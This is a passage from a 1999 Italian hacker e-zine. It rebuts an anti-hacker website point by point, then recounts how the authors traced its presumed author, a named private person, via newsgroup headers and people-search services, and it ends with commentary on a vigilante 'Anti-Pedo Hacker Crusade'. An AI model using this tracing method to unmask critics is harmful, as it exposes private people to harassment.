 per distruggere e affliggere a loro favore."

 [ Qui siamo alla pura illazione... se esistesse un sindacato di     ]
 [ categoria fioccherebbero denunce come se nevicasse.               ]
 [ Chissa' perche' tutti gli hackers famosi ora lavorano per varie   ]
 [ multinazionali e perche' spesso sono richiesti per le loro        ]
 [ abilita'. Vorrei anche sapere perche' meta' dei miei fratelli,    ]
 [ me compreso, lavora per ditte, negozi, providers, aziende...      ]
 [ Tanto a titolo informativo, chi era Steve Jobs? Bill Gates stesso ]
 [ ai tempi del college? Ah gia', dimenticavo che la vostra visione  ]
 [ di hacker e' abbastanza ristretta...                              ]
 [ Bello il linguaggio altisonante, ma parlate esattamente come      ]
 [ un qualunque media, e' un tentativo di demonizzare la categoria   ]
 [ per non so' quale ragione.                                        ]

"Normalmente sono dei single, e vivono da soli. Non sono solitari,
 ma frequentano gente del loro livello, e fanno amicizia quasi
 esclusivamente in quella direzione."

 [ Vediamo... sto contando quanti di quelli che conosco sono sposati ]
 [ o fidanzati (ciao |scacco| :). Poi a pensarci lavoro come DJ, ho  ]
 [ il "patentino" di animatore turistico, conosco moltissima gente   ]
 [ non del ramo e ci vado pure in vacanza insieme. Ho fatto sei anni ]
 [ di recitazione e... aspetta... io forse non sono normale...       ]

"Direi che sono i cosiddetti castrati del software, persone che
 hanno grosse potenzialita', che usano male per fare male al prossimo
 e vengono quindi dal prossimo reiettati.
 A questo punto dovreste avere le idee chiare sugli hacker. Se non
 ci credete... visitate i loro siti, e vedrete che, quanto esposto,
 e' vero, e reale."

 [ Se chi ha letto ha anche un pallido barlume di intelligenza,      ]
 [ l'unica idea negativa se la sara' fatta contro di voi... Mi       ]
 [ piacerebbe sapere quali sono questi siti che citate, e da dove    ]
 [ siete in grado di estrapolare il contesto sociale...              ]

"Se conoscete qualcuno, che vagamente assomiglia alla descrizione
 sopra fatta, evitate accuratamente qualsiasi tipo di confidenza.
 Qualsiasi cosa voi gli confiderete, questo la usera' contro di voi,
 se non direttamente, indirettamente alle vostre spalle.
 Direi che appartengono alla categoria dei Giuda, anzi, alla
 sottocategoria dei Giuda. Perche' Giuda si e' venduto per trenta
 denari, questi si vendono per la sola soddisfazione di fare del
 male, di violare, di distruggere il lavoro del prossimo."

 [ Non eravamo pagati da Sun Microsystem? Almeno che non si          ]
 [ contraddicano... e poi, ma hanno studiato da predicatori? Non     ]
 [ so' perche', ma discorsi simili, altisonanti e vuoti, sembrano    ]
 [ tanto assomigliare a certi discorsi di un certo ventennio...      ]

"Non mi ricordo chi, ma qualcuno ha detto che "sono lupi travestiti
 da agnelli". Ecco forse questa e' una definizione giusta. Si sono
 ammantati del fatto, di per se positivo, che hanno provocato
 l'arresto di delinquenti pedofili, solo per costruirsi una crosta
 di morale, quando in realta' non hanno morale, sono dediti ad
 adorare se stessi. Sono frustrati dalla vita che sfogano il loro
 marciume su Internet. Per quale motivo...
 Questo lo diremo nelle pagine delle ipotesi."

 [ Non credo si riferissero all'Anti-Pedo Hacker Crusade, di cui     ]
 [ parla pIGpEN in un'altro articolo... In ogni caso, sulla pagina   ]
 [ delle ipotesi ancora non ho letto nulla.                          ]

"Al momento ci limitiamo, e siamo stati generosi, a dare le
 definizioni e a darvi i link sottostanti a documenti hacker. In un
 prossimo futuro approfondiremo l'argomento."

 [ Guarda guarda chi c'e'... scendiamo di poche righe col nostro     ]
 [ browser, e troviamo nientemeno che l'introduzione al nostro sito  ]
 [ e l'articolo di Sh4mp00 pubblicato su BFi speciale natale '98...  ]
 [ Capite cosa intendevo all'inizio con "tirati in causa?"           ]
 [ In ogni caso, volendo giudicare con distacco la cosa, non mi pare ]
 [ abbiano scelto dei documenti cosi' significativi...               ]

                           -- [file:danni.htm ]--
     -- ["Danni provocati alla comunita' di Internet dagli Hacker"] --

"E' Vero che con questo sito non vogliamo insultare ne' denigrare
 nessuno. Tuttavia, la verita' va detta, anche se questa e' dura o se
 questa offende la dignita' di uno sparuto gruppo di sognatori.
 La verita' riflette la realta'."

 [ Finora lo avete fatto pesantemente...                             ]

 [...]

"Vediamo, prima la realta' americana e poi la nostra:
 La societa' Kroll Associates stima che il il 72% delle aziende
 americane  cita i propri concorrenti come sospetti di azioni di
 pirataggio industriale via Internet."

 [ Li cita come sospetti... perche' non fornire anche i risultati    ]
 [ dei procedimenti legali?                                          ]

"La Societa' americana Ernst & Young ha realizzato una statistica
 internazionale su un campione a larga scala dalla quale e' emerso
 che il 38%  delle aziende che hanno aperto la propria rete ad
 Internet e' stata  certamente vittima di spionaggio industriale
 attraverso il mezzo  informatico. Secondo una stima di FBI il 54%
 dei casi di spionaggio industriale al mondo viene fatto da Hacker
 attraverso Internet.
 Le vittime... Iniziamo da quelle piu' famose:
 Dall'interno:
 Intel, un dipendente trafuga tecnologie dei processori 486 e
 Pentium
 all'esterno via Internet.
 Dall'esterno:
 Oracle Corporation
 Agenzia giornalistica Reuters
 L'industria General Motors.
 Solo per citarne alcuni.
 Cito poi le migliaia di casi di Truffa con carte di credito, ai
 danni delle aziende che lavorano con il commercio su Internet,
 le truffe ai danni  delle banche, le truffe dai danni di enti
 pubblici."

 [ Bei nomi, bei numeri, belle citazioni? Da dove vengono queste     ]
 [ informazioni che voglio controllare?                              ]

"I responsabili di questo?
 I "Cyber Warrior" ovvero Hacker ovvero, come li definisce il
 periodico "Linea Edp" <veri e propri guastatori che agiscono
 spesso con motivi politici o dimostrativi>. Io rincaro la dose
 dicendo che sono un gruppo di sparuti imbecilli che rovinano quanto
 di bello vi e' su Internet."

 [ A parte che non ho mai sentito nominare quel periodico, in ogni   ]
 [ caso cita motivi politici o dimostrativi, di quelli economici non ]
 [ fa' menzione. Non e' che vi siete visti troppi film di            ]
 [ spionaggio? E poi, quante volte girando in internet chi sta       ]
 [ leggendo ora non ha potuto trovare quello che cercava perche'     ]
 [ danneggiato da hackers? Siamo realisti, suvvia...                 ]

"Guardiamo ora in casa nostra:
 Nonostante l'esplosione nel numero dei siti Web italiani, dovuta in
 buona  parte all'abbassamento dei prezzi per siti Web e domini,
 quest'anno  vi e' stato un calo, secondo l'associazione NoTut, di
 circa 300.000 utenti."

 [ Dati alla mano, da Internet News 01/99, pagina 81: 2 milioni di   ]
 [ computers connessi, tasso di crescita misurato a fine '98 del 60% ]
 [ rispetto al rilevamento precendente... dov'e' il calo?            ]
 [ E poi il movimento NoTut non combatteva per l'abolizione della    ]
 [ tariffa urbana a tempo? Che sappia io gli hackers non erano nella ]
 [ loro sfera di compentenza, non e' che forse i cali sono dovuti a  ]
 [ costi altissimi nella telefonia?                                  ]
 [ La cifra di 300.000 utenti poi e' proprio di un'altro mondo, dato ]
 [ che rappresenterebbe circa il 20% dell'utenza privata.            ]

"Questi utenti non rinnovano il proprio abbonamento .... perche'???
 Perche' abbiamo gli "unti della rete" gli Hacker, che a forza di
 nefandezze, stanno stancando gli utenti medio piccoli. Questo va a
 danno dei provider, della gente che potrebbe evolversi grazie ad
 Internet e non lo fa per paura di vedere polverizzato il proprio
 PC. E piu' in generale alla intera economia italiana. Infatti il 23%
 delle famiglie italiane possiede un PC, ma solo il 4 % ha un
 abbonamento Internet.... e sono in calo."

 [ Tutto questo casino per la paura di vedersi polverizzare il pc??  ]
 [ Non e' che magari e' perche' manca la base culturale che possa    ]
 [ spingere all'utilizzo della rete, perche' il telefono costa       ]
 [ salato, perche' le strutture sono lente e intasate? Vorrei tanto  ]
 [ avere testimonianze di qualcuno che non ha rinnovato              ]
 [ l'abbonamento per paura degli hackers...                          ]

"Gli Hacker sono tollerati in Italia, nonostante le leggi precise
 che li inchioderebbero a precisi reati penali con tanto di galera
 per decenni. Questa tolleranza e' dovuta all'unica azione positiva
 fatta dagli Hacker italiani, che e' quella di aver fatto arrestare
 dei pedofili. E in forza di questo merito, vengono lasciati
 scorrazzare liberamente su internet danneggiando i computer
 e sistemi altrui, rubando informazioni commerciali e segreti
 industriali."

 [ Ah, gli hacker adesso sono tollerati... e il bust di questa       ]
 [ settimana cos'era?                                                ]
 [ Per quanto riguarda gli anni di galera, sfogliando la legge del   ]
 [ 23 Dicembre 1993, n. 547 (in Gazzetta Ufficiale, 30 Dicembre,     ]
 [ n. 305) - "Modificazioni ed integrazioni alle norme del codice    ]
 [ penale e del codice di procedura penale in tema di criminalita'   ]
 [ informatica", la pena piu' pesante che ho trovato e' di otto      ]
 [ anni di reclusione... alla faccia dei decenni.                    ]

"E come sono furbi! Se ascoltate le scuse ufficiali dicono:
 Il sistema non era sufficientemente protetto, mancava questo,
 quello, quell'altro! e che dovizia tecnica nei particolari!"

 [ Mai sentita 'sta roba...                                          ]

 [...]

"E la polizia che fa?... in questi casi... un bel sorriso, perche'
 sa... i ladri ci danno una mano a scoprire i pedofili, e allora noi
 li tolleriamo, anche se scassano, rubano, e picchiano e violano
 il codice civile e penale.
 Questo esempio spiega a meraviglia l'attuale situazione. Situazione
 che e' strumentale, poi alle ipotesi che vengono fatte nella
 apposita pagina."

 [ Ma mi domando a volte se certa gente non andrebbe notata solo per ]
 [ l'incredibile fantasia... rimando comunque a tutti i bust degli   ]
 [ ultimi anni... altro che tolleranza.                              ]

"Lamentele:
 Abbiamo ricevuto oggi lamentele da parte di Hacker che ci accusano
 di essere prevenuti.
 Noi rispondiamo che e' vero, noi siamo prevenuti contro:
 l'imbecillita', l'idiozia, lo spionaggio industriale, i furti di
 tecnologia, e la persecuzione che voi Hacker fate nei confronti
 dei navigatori pacifici."

 [ Aggiungete questo articolo alla lista delle possibili lamentele,  ]
 [ e poi andate a rivedere la figura dell'hacker, che forse forse    ]
 [ avete le idee un po' confuse.                                     ]
 [ E' grazie a robaccia come la vostra, che demonizza senza la       ]
 [ minima cognizione di causa determinate categorie di persone, che  ]
 [ la cultura della rete in Italia resta sempre inchiodata allo      ]
 [ stesso, infimo, livello.                                          ]

 [...]

     -- [file:Lettere.htm - Le lettere che gli Hacker ci inviano. ] --

 [ Ecco l'ultima delle amenita' che popolano la pagina del Centro    ]
 [ "Il Timone", la lettera di un hacker...                           ]
 [ Partendo dal fatto che non ho mai visto sul loro sito uno         ]
 [ straccio di indirizzo email, e quindi mi domando come questo      ]
 [ tizio, nel caso non sia tutta una pura invenzione, ne sia venuto  ]
 [ in possesso, sono tentato dal giudicare tutto cio' che segue una  ]
 [ vera e propria bufala, scritta dagli autori stessi del sito per   ]
 [ dare acqua al loro mulino.                                        ]
 [ Nessuno, fra chi conosco, avrebbe MAI scritto niente di simile.   ]
 [ Se questo Frigor Mortem (ahah) esiste sul serio, non e' altro     ]
 [ che uno dei peggiori esempi di esaltato... o lamer che dir si     ]
 [ voglia                                                            ]

"Return-Path: frigormortem@mindless.com
 Reply-To: "-= FRigoR MorteM =-" frigormortem@mindless.com
 From: "-= FRigoR MorteM =-" frigormortem@mindless.com
 To: "Grazia Bottari" graziabottari@usa.net
 Subject: R: Ti rispondo solo per prenderti per il culo
 Date: Mon, 8 Feb 1999 14:56:07 +0100"

 [ Uhm... ora del messaggio... 14:56:07... 14567? Puzza...           ]

"X-MSMail-Priority: Normal
 X-MimeOLE: Produced By Microsoft MimeOLE V4.72.2106.4

  -----Messaggio originale-----

 Da: Grazia Bottari graziabottari@usa.net
 A: FRigormortem@mindless.com frigormortem@mindless.com
 Data: lunedi' 8 febbraio 1999 14.27"

 [ Risposta proprio a stretto giro di posta eh...                    ]

"Oggetto: Ti rispondo solo per rispetto ad ...

 Io non sono disponibile al dialogo , perche' sono un Hacker, e gli
 Hacker se  le trombano le donne, non ci discutono!.
 Siete esseri inferiori e spregevoli.
 Noi Hacker siamo superiori, per sesso, intelligenza e numero.
 Ci avete offesi, pagherete amaramente per le ingiurie che ci avete
 fatto. Se noi prendiamo i soldi da Sun Microsystem sono affari
 nostri, a lei che le importa, non sara' mica delle tasse?
 Internet e' nostra, e noi non vi vogliamo sulla rete. Chi se ne
 frega se gli utenti non rinnovano gli abbonamenti, tanto noi mica
 li paghiamo.
 Disponibilissimo per un confronto , ma solo in camera da letto!
 E sono sicuro che questo tipo di dialogo le piacera'.
 Magari potrebbe imparare qualcosa.... anche se sono un Ladro,
 oppressore, stronzo e via cosi'...
 Comunque , prendo atto di tutto , non se ne preoccupi.
 Comunque , mi faccia almeno il favore di leggere questa mia, e,
 se volesse darmi cenno della lettura avvenuta , potrebbe anche
 rispondermi...

 In attesa di un suo commento la saluto ,

 FRigor MorteM"

 [ Ma vogliamo credere sul serio a una mail come questa????          ]
 [ O e' un falso, o e' un esaltato...                                ]

"Risposta:

 Eccoti il cenno di risposta:

 Caro FRigor, sono Vincenzo, hai una sola fortuna, quello di essere
 anonimo. Sei maleducato, villano, prevenuto ed incivile. Rendi
 bene l'idea di chi sono gli Hacker."

 [ Anonimo? Ma quanto ne sapete voialtri di computers? Facciamo due  ]
 [ conti e andiamo a deduzione... mindless.com e' un forwarder, e    ]
 [ piu' precisamente uno dei domini disponibili da NetForward (da    ]
 [ non confondere con NetAddress). Di conseguenza da qualche parte   ]
 [ nell'header dovrebbe apparire il vero indirizzo di email di chi   ]
 [ l'ha spedita, anche nel caso avesse telnettato alla 25 di un      ]
 [ altro server... forse ha fatto giri particolari? E' un vero       ]
 [ hacker? Non ci credo... dai, dov'e' l'X-Sender?                   ]

"Avevamo intenzione di non pubblicare la lista dei siti Hacker, ma
 visto il vostro comportamento e la tua incivilta', non solo
 compiliamo la lista dei siti Hacker che troviamo, ma la
 comunichiamo agli organi dello Stato, sia di Pubblica Sicurezza,
 che di controllo sulle telecomunicazioni.

 Saluti

 Vincenzo"

 [ Nostro comportamento? Facciamo di tutta l'erba un fascio?         ]
 [ Come preferite, comunicatelo pure agli organi dello Stato...      ]
 [ \sPIRIT\ - s0ftpr0ject 99 - http://softpj98.bbk.org, ma tenete    ]
 [ anche conto che ci sono gia' passati, abbiamo visto gli ip dalle  ]
 [ statistiche del counter...                                        ]

                                    ---

Il sito termina qui, e anche il mio commento. Ho voluto commentare il meno
possibile per darvi l'idea di che gente scriva porcate del genere, senza
incastrarmi in polemiche verbali esagerate, che mi avrebbero solo fatto
perdere tempo.
Faccio notare comunque il campo "To:" dell'email pervenuta al sito, che e'
"Grazia Bottari" <graziabottari@usa.net>, vale la pena provare a scrivere
qualcosa (anche se credo non si avra' mai risposta).
Gia' che sono qui invito questo gruppo "Il Timone" a rispondere
pubblicamente alla provocazione che ho lanciato, l'indirizzo di posta e'
bfi98@usa.net , dovreste saperlo gia' visto che ci avete letti, e a
pubblicare il tutto sulla vostra pagina web...
...chissa' perche', ma credo che avra' la meglio la coda di paglia e cio'
non avverra' mai...
Statemi bene, e d'ora in poi occhio a cosa vi vendono, non tutta la roba
la' fuori e' roba buona. E ora scusatemi, vado a fare dello spionaggio
industriale per digerire... <BURP>
                                                              \sPIRIT\
                               -- PARAN0iA --
A pensarci dopo con freddezza, tutto mi sembra molto piu' sospetto. Sara'
la paranoia, ma e' meglio considerare tutte le ipotesi.
Analisi della faccenda: il sito originale di questo fantomatico Eduardo
Freni (che fra parentesi non ha un telefono proprio, sugli elenchi di
Firenze e dintorni nemmeno l'ombra...), cioe'
http://www.fol.it/ergo/eduardofreni/ , e' stato avvistato in forma di URL su
di un newsgroup di sicurezza. Se avete letto l'articolo di FuSyS sullo
speciale natale '98 saprete gia' tutto.
Qui cominciano a viaggiare le ipotesi.
Era un sito pieno di stronzate, credibilita' zero. Io non l'ho visto,
pero' me lo immagino.
A quanto ne so' gli unici a raccogliere il sito come "provocazione" siamo
stati noi s0ftpj, con l'articolo sopracitato.
Risultato: a meta' gennaio il sito sparisce e compare un link a una pagina
su Geocities, quella che ho commentato poche ore fa.
La credibilita' della nuova pagina del gruppo Il Timone e', se possibile,
veramente a rasoterra. Pagina scarna, fondo bianco e solo delle lunghe
invettive contro gli hackers... viene da chiedersi se certa gente non abbia
di meglio da fare.
L'ipotesi formulata pero' e' sconcertante. In tutta la pagina de Il Timone
non compare ne' un link a un sito di sicurezza, ne' ad uno di presunti
hackers, e il tutto non e' aggiornato da una ventina di giorni buoni...
inoltre la pagina e', come gia' detto, troppo scarna. Strano per essere il
manifesto di un gruppo che si offre di proteggere gli utenti internet
italiani. Se poi consideriamo che le uniche citazioni sono proprio tratte
da materiale made in s0ftpr0ject, e' possibile che il tutto sia solo
un'iniziativa personale del sedicente Eduardo, per darci a noia. Non si
spiegano le ragioni, altrimenti.
A questo punto, spinto da paranoia ulteriore, ho guardato i sorgenti delle
pagine. L'index.html e' stato creato con il Frontpage 98, lo si vede dalla
META GENERATOR, ed e' solo la specifica dei frames. Fin qui nient'altro di
sospetto. La cosa diventa pero' ancora piu' sospetta quando si scopre, a
suon di notepad, che le altre pagine che compongono il sito sono state
scritte in maniera semplicissima con un editor qualunque, tag html
compresi. Troppo strano per un lamer qualunque, perche' avrebbe dovuto fare
fatica?
Niente di niente da nessun'altra parte... solo quel maledettissimo
redirector su fol.it... (e la fortuna enorme che il sito su Geocities e'
stato catalogato da Altavista, e ci sono capitato da li').
Loggare Geocities? Impossibile. Loggare usa.net? Altrettanto impossibile...
Loggare www.fol.it e quindi il redirector? ... Il campanello d'allarme e'
incerto se suonare e dire "Cops Cops Cops" o stare zitto in rispetto
dell'incredibile lamerata. Non avranno creduto che saremmo stati cosi'
pazzi da bucare fol.it per trovare dati su Eduardo Freni? Io non mi farei
piu' vedere...
Scrivere a graziabottari@usa.net? Solo da anonymizer, e per la reply
includere il proprio indirizzo di forward nella signature, se proprio si
deve.
                            -- THE DAY AFTER --
Non poteva finire cosi', certi scazzi non meritano di restare solo delle
ipotesi.
Cosi', visto che la fantomatica associazione Il Timone pareva
irrintracciabile (nessuna registrazione al Comune di Firenze, solo
quell'indirizzo di email su usa.net), l'approccio e' stato diverso.
Bisognava trovare quel "famoso" Eduardo Freni, che linka allegramente al
sito del Timone dalla sua pagina (ora rimossa, o cosi' SEMBRAVA...).
Si e' partiti dalle poche cose che si sapevano. il gruppo Il Timone pareva
essere di Firenze, il sito di Freni su www.fol.it. Veloce query al NIC, ed
e' venuto fuori che effettivamente www.fol.it e' Firenze Online, fornitore
di servizi associato TIN.
Secondo: dato che tutto era nato prima di natale da una lurkata di FuSyS su
it.comp.sicurezza.varie, serviva una controllata anche li'. Browser puntato
a www.dejanews.com, ricerca ristretta al newsgroup da 1 Oct 1998 a 26 Feb
1999, parole chiave "Eduardo Freni". Risultato: numerosi commenti di utenti
generici, e solo 3 posting in newsgroup per il nostro WANTED DEAD OR ALIVE.
Occhiata all'header di uno dei posting, ed ecco saltare fuori un indirizzo
email @tin.it... perfetto.
Tentativo (andato a buon fine): se a www.fol.it/ergo/eduardofreni/ c'era
la pagina incriminata, che mai ci sara' a /ergo/ e basta? Si scopre cosi'
che, pessimo html a parte, quella era la pagina di una "azienda"
(capirete dopo le virgolette) di Firenze che forniva consulenza,
montaggio PC e software autoprodotto e non. Azienda rilevata da, guarda
guarda, Eduardo Freni, con tutti i prodotti e i marchi registrati (ahaha).
Mi astengo dal commentare l'altissima percentuale di lamerosita' del tutto,
in ogni caso... articoli come "cos'e' uno scanner", e cose simili.
Nonostante cio'... BINGO, e' la pagina della nuova 3.Millennium Software,
con indirizzo e numero di telefono, che fa' capo al nostro caro Freni.
Terzo: fin qui ok, ma i dati in mano potevano non bastare, ora di
riguardare i dati in possesso... un numero di telefono, un indirizzo, due
indirizzi di email (uno di tin.it e uno di fol.it)... un attimo...
tin.it... magari era una follia, ma bisognava tentare... browser lanciato
su http://mailory.tin.it, Cognome: Freni, Provincia: Firenze, Stato:
Italia.
Nessun risultato... non che ci si sperasse. Altra prova, questa volta su
WhoWas e Four11... qualche secondo di load, ed ecco qui, Four11 mostra
qualche hit, e una e' proprio a nome di Eduardo Freni! More info...
loading... tutti i dati del nostro ricercato sott'occhio, e, guarda caso, i
dati personali corrispondono perfettamente a quelli pubblicati sulla sua
pagina, o meglio sulla ex pagina della Ergo Software...
A questo punto si puo' seppellire la faccenda. L'hacker va' a nanna
contento che ancora una volta ha scovato l'infame, e proprio in merito a
questa soddisfazione crede che lo lascera' in pace, certa gente non
merita cosi' tanta attenzione... zero cop, tutto ok.

                               - l'autore preferisce restare anonimo -
                                            - trascritto da \sPIRIT\ -
NOTA CONCLUSIVA:
Pochi giorni fa dalle pagine de "Il Timone" e' stata sostituita la parola
"SUN" con "S.." . E' legittimo ipotizzare che i nostri signori antihacker
abbiano ricevuto una telefonata da parte dei legali della societa'.
Anzi, noi ne siamo _SICURI_ :> AHAHAH.


-----------------------------------[ NEWS ]-----------------------------------
-----------------------------[ pIGpEN + Cavallo ]-----------------------------

- GUERRA SANTA 0 GUERRA STELLARE -

Dedicato a BXX BXXXX, uno che mi ha insegnato a buttar fuori quello che penso.
Musica ascoltata: Family Tree - Megadeth
(guardate che noi di BFi mettiamo il cibo e la musika su ogni articolo sperando
che siano un'attenuante alle nostre menti deviate in sede di processo ;)))
Ringraziamenti: "All'inizio volevo prendere questo articolo e cestinarlo...
ringrazio chi me l'ha proibito di fare" una volta tanto voglio dire quello che
penso apertamente...
QUESTO ARTICOLO NON ERA DESTINATO PER BFi, SAREBBE RESTATO SOLO UNA EMAIL...

Mentre stavo leggendo Computer Programming di gennaio 99 a pag 109 notai una
parte curata da Andrea Monti nella quale egli commentava un articolo apparso
sul Corriere della Sera di non so quando.
Mi ha molto interessato l'argomento a tal punto da scrivere un pezzo a
riguardo, premetto che i miei commenti non sono indirizzati a nessuno in
particolare (non posso di certo pretendere che chi scrive per Computer
Programming legga BFi...), ma vorrei fare un discorso, spero costruttivo, e
non "sputtanante".

NB: Le parti tra virgolette sono tratte dall'articolo apparso sul Corriere
della Sera. Quello che segue e' il commento di Andrea Monti. Quello tra [ ]
e' la parte scritta da me, pIG.

[ PREMESSA
Non faccio parte dell'Anti-Pedo Hacker Crusade ne' credo che nessuno dei miei
fratelli che scrivono per BFi ne sia membro.
Piu' che come "hacker" (lo metto tra virgolette perche' sono arrivato al punto
da non essere io a definirmi tale e se facciamo nomi come Jobs & company beh
allora sono proprio fuori da questa categoria) parlo come persona umana
smanettona (si'si' la def. su Spaghetti Hacker mi catalogherebbe in questa
categoria... e la cosa mi fa alquanto sorridere se penso al fatto che quando
giravo fuori dalla scena italiana si faceva la differenza tra hacker e guru..
qui in Italia non siamo degni nemmeno di pronunciare la parola hacker: e' come
dire Gesu' Cristo... ma io mi chiedo: alla fine chi e' a bucare i sistemi?
Richard Stallman o i tipi come Phiber Optik?... quando si parla di galera
all'improvviso gli smanettoni diventano hacker, terroristi solo per far vedere
che finalmente e' stato preso il pesce grosso. Ok Jobs era un hacker, fumava
erba, vendeva blue box e Dio solo sa che cosa... Mitch Kapor era un hacker,
e' un membro dell'EFF (mi correggo, uno dei fondatori) e come viene detto in
Cyberia scritto da Rushkoff (per favore non fate come i giornalisti italiani
che leggono solo Spaghetti Hacker) i soldi che mette nell'EFF non sono poi
diversi da quelli che usa in processo per accusare qualche "copiatore senza
permesso" di programmi della Lotus (non oso usare il termine pirata perche'
se no facciamo casino).

La storia su chi considerare hacker e chi no mi fa alquanto ridere...
Se uno si vuole far chiamare hacker che lo faccia pure, personalmente e per
fortuna non solo io considero Jobs & company dei guru, chi scrive exploit
e' un bravo programmatore, ma chi buca i sistemi beh quello e' l'hacker miei
cari signori.
All'inizio non si faceva differenza perche' all'epoca di Kapor ci si trovava
ad hackare poche righe di codice e capitava spesso che chi cercava exploit
era poi quello che andava a curiosare... ora mi sa che con i sistemi moderni
con kernel da paura la figura del guru/hacker integrato in un unico pezzo di
silicio celebrale non si possa piu' considerare... se non per poche persone
che vanno alla ricerca di buffer overflow e altro per scopi intrusivi e non
solo di conoscenza.... e allora qua si avrebbe una definizione di hacker
alquanto restrittiva e che non includerebbe nemmeno i nostri tanto nominati
Jobs, Stallman (non mi sembra che queste persone siano accusate in questi
tempi di aver curiosato chissa' in quale sistema e non mi dite che non si
fanno beccare perche' allora mi metto a ridere... gente come loro adesso ha
cose piu' interessanti da fare).
ok... ]

La "guerra santa" non legittima l'istigazione a delinquere. E non c'e' rete che
tenga.

La notizia e' pubblicata sul "Corriere della Sera" di qualche tempo fa: un
sacerdote del siracusano - gia' noto per le sue crociate anti-pedofili
culminate nella denuncia di siti contenenti materiale osceno, sconsolato per
la pochezza dei risultati (operazioni internazionali che scovano quattro
gatti, per di piu' solo "guardoni") decide - in ossequio alla universale
massima filosofica "chi fada se, fa per tre" - di farsi giustizia da solo...
beh, quasi, visto che per raggiungere lo scopo avrebbe radunato una
quarantina di (sedicenti) hacker. Il gruppo coordinato dal sacerdote ha
pensato di darsi una veste giuridica, e dunque - da quanto e' dato di capire -
pare sia costituito in un'associazione che - come vedremo - potrebbe
sconfinare nell'associazione a delinquere.
Una delle prime uscite pubbliche di questa APHC (Anti-Pedo Hacker Crusade) e'
un comunicato dal tenore inquietante sia per la forma (alquanto sgrammaticata)
sia per i contenuti (inni al vigilantismo e alla limitazione della liberta' di
espressione, deliberata violazione di leggi) che commentero' di seguito.

A SCANSO DI EQUIVOCI
Tanto per essere chiari: ho intenzione di esprimere opinioni fortemente
critiche su questa vicenda e quindi, per una questione di sicurezza, non
citero' dei passi ma il testo integrale del comunicato stampa in questione (in
corsivo) [ pIG: naturalmente su BFi non vedete il corsivo :) metto tra
virgolette ]. Credo inoltre necessario fare alcune precisazioni. Come oramai
saprete, la recente storia giuridica e' piena di indagini costruite sulla
minaccia del "pericolo elettronico numero 1" di turno, di volta in volta
incarnato da gente che cerca di non pagare la bolletta o dedita al cambio delle
home-page. Intendiamoci, non che tutto questo sia accettabile (se il fatto e'
previsto dalla legge come reato c'e' poco da fare), ma certamente non si tratta
di emergenze di sicurezza nazionale. Ogni volta i mezzi di informazione hanno
fatto a gara per rappresentare questi fatti come un allarme per il futuro
prossimo venturo, auspicando interventi normativi, processi e quant'altro.
Ora siamo di fronte ad un fenomeno (almeno per i piu') nuovo: niente geni dei
computer, niente server supersegreti, nulla di tutto cio', soltanto delle
persone che hanno deciso di farsi giustizia da sole usando una tecnica
complessa invece di forche e roghi. In altre parole, siamo di fronte ad un
tentativo di legalizzare (o moralizzare) l'intolleranza, tentativo che se
dovesse giungere a compimento, produrrebbe effetti devastanti.

ANDIAMO AD INCOMINCIARE
"Lettera aperta degli hackers contro la pedofilia in rete"
Credo di poter vantare una certa esperienza nel settore che impropriamente
viene definito hacking e fra le tante incertezze uno dei pochi punti "fissi" e'
che la "categoria" non e' sindacalizzata, non ha cioe' rappresentanti o
rappresentanze che possano arrogarsi il diritto di parlare a nome di tutti.
Il comunicato stampa risulta dunque quantomeno ambiguo gia' dal titolo
(BTW non mi risulta che Richard Stallman o Lee Felnstein o Steve Jobs o
qualsiasi altro hacker vero abbia aderito a questa campagna).

[ Qui dipende tutto da cosa si intende per hacker: e' la storia di cui
dicevo sopra, comunque purtroppo devo dire che esistono gruppi a struttura
gerarchica e secondo me sono quelli piu' pericolosi perche' poche menti
controllano una massa di "perditempo". Come capirete dopo non intendo definire
in questo modo i membri dell'APHC... non ho conoscenze dirette per giudicarli,
ma posso dire che gruppi gerarchizzati esistono e ne potrei citare uno che
usava mezzi del genere contro dei nxxxxxi, ma devo dar ragione a Monti: in
questo caso e' diventato un pretesto per bucare il bucabile e tirar giu' ISP...
e anche se magari uno dei clienti era anche di idee molto discutibili ne
facevano la spesa un sacco di persone... Credo che sia come chiedere ad un
ladro di portafogli di rubare quello di un assassino per sapere la sua
identita' e dire a questo che si puo' tenere i soldi... ma e' solo il mio
parere. ]

"La recente alleanza con il Telefono Arcobaleno di don Fortunato Di Noto per la
lotta alla pedofilia in rete, ha posto gli hackers al centro di un interessante
dibattito nel quale gli hackers stessi non intendono svolgere un ruolo di
spettatori, ma al contrario desiderano partecipare in una logica di dialogo e
di massimo rispetto verso le piu' diverse opinioni. Don Fortunato e' un
innovatore e forse un rivoluzionario perche' ha deciso di allearsi con i pirati
o forse ha saputo semplicemente sfruttare le potenzialita' e la buona fede di
persone scarsamente capite e spesso inutilmente combattute?"

Facciamo a capirci: e' vero che sull'hacking e' in corso un dibattito
scientifico e giudiziario molto acceso, nel quale ho assunto spesso posizione
di forte contrasto con la formulazione della legge vigente, ma non mi sono mai
sognato di considerare come dei martiri, soggetti che commettono degli atti
illeciti.

[ Niente da dire ]

"La verita' e che la rete, al di la' delle sue infinite doti, della sua
straordinaria essenza libertaria, della sua natura democratica, oggi, cosi'
come e', offre notevoli vantaggi a criminali di vario genere tra cui si
annoverano in prima linea i pedofili. Chi voglia negare tale ultima circostanza
difficilmente potrebbe essere giudicato intellettualmente onesto."

Questa e' una bufala bella e buona. Nonostante i metodi di indagine - a volte
discutibili - adottati dalle Forze dell'ordine, non si puo' discutere il fatto
che la trasparenza della Rete consente di raggiungere ed identificare
abbastanza facilmente i responsabili di certe azioni (poi si puo' discutere su
come sono state fatte le indagini, sulla correttezza tecnica della formulazione
degli articoli di legge, ma questo e' un altro paio di maniche).
Quanto alla questione dell'onesta' intelletuale, sarebbe interessante conoscere
le fonti che vedono i pedofili ai vertici dell'Internet criminale, specie
perche' anche le pubblicazioni scientifiche piu' recenti (es. Serra-Strano
Nuove frontiere della criminalita' Milano 1997) non forniscono dati rilevanti
sul punto. Di regola, quando si citano dati si dovrebbe fare altrettanto con la
loro provenienza, altrimenti si fa strada il sospetto che i dati non sono
attendibili o che non esistono.

[ Non ho dati in proposito :) ]

"Il dibattito circa un'eventuale regolamentazione della rete delle reti pone
difficili questioni di diritto, con delicati risvolti sociologici e filosofici
che non riteniamo di dover affrontare. Internet e' gia' cio' che desideriamo e
la legge italiana e' gia' fin troppo efficace, sulla carta. Resta un problema.
La normativa e' assolutamente inutile. Perche' il cyberspazio non conosce
confini ne' delimitazione geografica e non ha giurisdizione. Allora, il
dibattito dovra' necessariamente svolgersi su scala mondiale perche' la rete e'
una questione globale."

